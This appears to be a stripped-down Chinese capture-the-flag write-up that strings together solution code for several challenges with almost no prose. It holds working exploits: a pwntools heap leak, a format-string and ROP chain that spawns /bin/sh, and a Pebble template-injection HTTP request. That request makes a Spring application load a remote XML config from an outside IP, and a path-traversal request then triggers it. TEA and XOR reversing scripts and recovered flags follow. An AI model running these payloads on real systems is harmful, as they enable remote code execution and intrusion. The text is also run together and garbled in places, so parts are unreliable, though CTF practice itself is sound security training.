add("0.0.0.0", "0.0.0.0") # 32add("64.0.0.0", "0.0.0.0") # 2add("32.0.0.0", "0.0.0.0") # 3add("96.0.0.0", "0.0.0.0") # 2add("16.0.0.0", "0.0.0.0") # 4add("80.0.0.0", "0.0.0.0") # 2add("48.0.0.0", "0.0.0.0") # 3add("112.0.0.0", "0.0.0.0") # 2add("0.4.0.0", "0.0.0.0") # 14
flag = ""get_flag()show(b"0.4.0.0") # 0x40io.recvuntil(b"The next hop is ")info = io.recvuntil(b"n", drop=True)parts = info.split(b".")parts = parts[::-1]ascii_values = [chr(int(part)) for part in parts]ascii_values = "".join(ascii_values)flag += ascii_valueslog.success(flag)
flag += leak(128)log.success(flag)
flag += leak(192)log.success(flag)
flag += leak(160)log.success(flag)
flag += leak(144)log.success(flag)
flag += leak(208)log.success(flag)
flag += leak(176)log.success(flag)
flag += leak(240)log.success(flag)
flag += leak(224)log.success(flag)
add(b"128.4.0.0", b"0.0.0.0")get_flag()show(b"128.4.0.0") # 0x40io.recvuntil(b"The next hop is ")info = io.recvuntil(b"n", drop=True)parts = info.split(b".")parts = parts[::-1]ascii_values = [chr(int(part)) for part in parts]ascii_values = "".join(ascii_values)flag += ascii_valueslog.success(flag)io.interactive()
#!/usr/bin/env python3'''Author:
7resp4ssDate:
2023-12-16 13:34:
34Usage: Debug : python3 exp.py debug elf-file-path -t -b malloc Remote: python3 exp.py remote elf-file-path ip:
port'''
from pwncli import *cli_script()

io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
filename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debug
ru('There is a gift for you ')leak_stack = int(rl()[:-1],16)leak_ex2(leak_stack)

attack_stack = leak_stack - 0x8pd = flat( { 0:'%' + str(0xce) + 'c' + '%11$hhn%19$p', 0x18:[0x401205], 0x28:
attack_stack, })s(pd)ru('0x')leak_libc = int(r(12),16)leak_ex2(leak_libc)lb = leak_libc - 0x24083libc.address = lb
pd = flat( { 0x18:[ CG.pop_rdi_ret(), CG.bin_sh(), lb + 0x51cd2] })S()s(pd)
ia()
org.springframework.context.support.ClassPathXmlApplicationContext
org.springframework.context."+"support.ClassPathXmlApplicationContext
POST /uploadFile HTTP/1.1Host: eci-2ze7ksohishwh34f2u43.cloudeci1.ichunqiu.com:
8088Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 567
content=%7B%25%20set%20y%3D%20beans.get(%22org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory%22).resourceLoader.classLoader.loadClass(%22java.beans.Beans%22)%20%25%7D%0A%7B%25%20set%20yy%20%3D%20%20beans.get(%22jacksonObjectMapper%22).readValue(%22%7B%7D%22%2C%20y)%20%25%7D%0A%7B%25%20set%20yyy%20%3D%20yy.instantiate(null%2C%22org.springframework%22%2B%22.context.support.ClassPathXmlApplicationContext%22)%20%25%7D%0A%7B%7B%20yyy.setConfigLocation(%22http%3A%2F%2F47.76.178.89%3A8081%2F1.xml%22)%20%7D%7D%0A%7B%7B%20yyy.refresh()%20%7D%7D
public static String general_time() { LocalDateTime currentTime = LocalDateTime.now(); DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss"); String var10000 = currentTime.format(formatter); String fileName = "file_" + var10000 + ".pebble"; System.out.println("filename is " + fileName); return fileName;}
GET /?x=../../../../../../../../tmp/file_20231217_160502 HTTP/1.1Host: eci-2ze7ksohishwh34f2u43.cloudeci1.ichunqiu.com:
8088Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
    #include <stdio.h>#include <stdint.h>
//加密函数void encrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){ unsigned int i; uint32_t v0 = v[0], v1 = v[1], sum = 0x90508D47, delta = 0x77BF7F99; for (int j = 0; j < 4; j++) { for (i = 0; i < num_rounds; i++) { v0 += (((v1 >> 4) ^ (v1 << 5)) + v1) ^ (sum + key[sum & 3]) ^ sum; v1 += (((v0 >> 4) ^ (v0 << 5)) + v0) ^ (sum + key[(sum >> 11) & 3]); sum -= delta; } } v[0] = v0; v[1] = v1; printf("sum==0x%xn", sum);}
//解密函数void decrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){ unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x77BF7F99, sum = 0xd192c263; for (int j = 0; j < 4; j++) { for (i = 0; i < num_rounds; i++) { sum += delta; v1 -= (((v0 >> 4) ^ (v0 << 5)) + v0) ^ (sum + key[(sum >> 11) & 3]); v0 -= (((v1 >> 4) ^ (v1 << 5)) + v1) ^ (sum + key[sum & 3]) ^ sum; } } v[0] = v0; v[1] = v1; printf("sum==0x%xn", sum);}
//打印数据 hex_or_chr: 1-hex 0-chrvoid dump_data(uint32_t *v, int n, bool hex_or_chr){ if (hex_or_chr) { for (int i = 0; i < n; i++) { printf("0x%x,", v[i]); } } else { for (int i = 0; i < n; i++) { for (int j = 0; j < sizeof(uint32_t) / sizeof(uint8_t); j++) { printf("%c", (v[i] >> (j * 8)) & 0xFF); } } } printf("n"); return;}
int main(){ // v为要加解密的数据 uint32_t v[] = {0x9523f2e0, 0x8ed8c293, 0x8668c393, 0xddf250bc, 0x510e4499, 0x8c60bd44, 0x34dcabf2, 0xc10fd260}; // k为加解密密钥，4个32位无符号整数，密钥长度为128位 uint32_t k[4] = {0x62, 0x6F, 0x6D, 0x62}; // num_rounds，建议取值为32 unsigned int r = 33;
 int n = sizeof(v) / sizeof(uint32_t); /* printf("加密前明文数据："); dump_data(v, n, 1);
 for (int i = 0; i < n / 2; i++) { encrypt(r, &v[i * 2], k); } */ printf("加密后密文数据："); dump_data(v, n, 1);
 for (int i = 0; i < n / 2; i++) { decrypt(r, &v[i * 2], k); }
 printf("解密后明文数据："); dump_data(v, n, 1);
 printf("解密后明文字符："); dump_data(v, n, 0);
 return 0;}
// W31com3_2_Th3_QwbS7_4nd_H4v3_Fun
enc = [0x3A, 0x2C, 0x4B, 0x51, 0x68, 0x46, 0x59, 0x63, 0x24, 0x04, 0x5E, 0x5F, 0x00, 0x0C, 0x2B, 0x03, 0x29, 0x5C, 0x74, 0x70, 0x6A, 0x62, 0x7F, 0x3D, 0x2C, 0x4E, 0x6F, 0x13, 0x06, 0x0D, 0x06, 0x0C, 0x4D, 0x56, 0x0F, 0x28, 0x4D, 0x51, 0x76, 0x70, 0x2B, 0x05, 0x51, 0x68, 0x48, 0x55, 0x24, 0x19]tbs = ["l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr", "FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8", "Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA", "pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a", "plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6"]aaa = [ord(c) for c in "plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6"]for i in range(len(aaa)): aaa[i] ^= 0x27v5 = aaa[6:6+0x15]v7 = 2023v6 = 0v8 = 48xor = []while v6 < v8 - 1: if v6 % 3 == 1: v7 = (v7 + 5) % 20 v3 = v5[v7 + 1] elif v6 % 3 == 2: v7 = (v7 + 7) % 19 v3 = v5[v7 + 2] else: v7 = (v7 + 3) % 17 v3 = v5[v7 + 3] v6 += 1 xor.append(v3)for i in range(len(enc)-1, -1, -1): enc[i] ^= enc[i-1] if i <= len(enc)-2: enc[i] ^= xor[i]print(bytes(enc))
# jZqSWcUtWBLlOriEfcajWBSRstLlkEfFWR7j/R7dMCDGnp==
flag{3ea590ccwxehg715264fzxnzepqz}
from pwn import remote
ip = ''port = ''
class GetStatus: def __init__(self, _ip=ip, _port=port) -> None: self.r = remote(_ip, _port) self.score = 0
 def getdiff(self, out): self.r.sendlineafter('请出拳'.encode(), str(out).encode()) self.r.recvuntil('分数：'.encode()) newscore = int(self.r.recvline().decode()) diff = newscore - self.score self.score = newscore return diff
 def test_list(self, lis): for out in lis: diff = self.getdiff(out) if self.score >= 260: return 'win' return diff
current_best = [0] * 5diff2out = { 3: 0, 1: 2, 0: 1}
while len(current_best) <= 100: current_best.append(0) c = GetStatus() diff = c.test_list(current_best) if c.score >= 260: c.r.interactive() break c.r.close() current_best[-1] = diff2out[diff] print(f'Round {len(current_best)}: {current_best}')
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702891838.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/4-1702891840.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1702891841.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1702891841.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702891843.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/3-1702891844.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1702891845.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1702891846.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1702891847.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/6-1702891848.png)